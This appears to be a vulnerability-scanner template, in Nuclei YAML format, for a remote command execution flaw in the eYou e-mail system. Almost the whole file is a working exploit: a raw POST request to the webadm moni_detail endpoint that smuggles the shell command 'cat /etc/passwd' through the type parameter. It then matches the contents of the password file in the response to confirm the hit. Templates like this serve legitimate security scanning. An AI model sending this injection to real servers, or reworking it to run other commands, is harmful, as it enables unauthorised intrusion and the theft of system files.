id: eyou-email-rce
info:
  author: pikpikcu
  name: eYou E-Mail system RCE
  reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  severity: critical
  tags: rce,eyou
requests:
- matchers:
  - part: body
    regex:
    - root:.*:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
    \ Chro\xB7me/89.0.4389.114 Safari/537.36\nContent-Length: 25\nCache-Control: max-age=0\n\
    Upgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\n\
    \ntype='|cat /etc/passwd||'\n"
